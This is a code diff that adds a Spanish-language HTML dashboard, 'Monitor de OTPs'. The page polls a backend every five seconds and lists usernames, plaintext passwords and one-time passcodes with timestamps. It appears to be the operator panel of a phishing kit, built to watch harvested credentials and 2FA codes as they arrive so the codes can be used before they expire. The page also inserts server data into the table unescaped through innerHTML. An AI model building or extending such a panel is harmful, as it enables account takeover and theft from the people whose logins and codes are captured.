@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Monitor de OTPs</title>
+  <style>
+    body { font-family: Arial, sans-serif; padding: 20px; }
+    table { border-collapse: collapse; width: 100%; }
+    th, td { border: 1px solid #ccc; padding: 8px; text-align: left; }
+    th { background-color: #f4f4f4; }
+  </style>
+</head>
+<body>
+ <h1>Registros consolidados</h1>
+<table id="tabla-consolidada">
+  <thead>
+    <tr>
+      <th>Usuario</th>
+      <th>Clave</th>
+      <th>OTP</th>
+      <th>Fecha</th>
+    </tr>
+  </thead>
+  <tbody></tbody>
+</table>
+
+
+
+  <script>
+    async function cargarConsolidado() {
+  const res = await fetch('/ver-consolidado');
+  const datos = await res.json();
+  const tbody = document.querySelector('#tabla-consolidada tbody');
+  tbody.innerHTML = '';
+
+  datos.forEach(registro => {
+    const fila = document.createElement('tr');
+    fila.innerHTML = `
+      <td>${registro.usuario}</td>
+      <td>${registro.clave}</td>
+      <td>${registro.otp}</td>
+      <td>${registro.creado_en}</td>
+    `;
+    tbody.appendChild(fila);
+  });
+}
+
+cargarConsolidado();
+setInterval(cargarConsolidado, 5000);
+
+
+  </script>
+</body>
+</html>
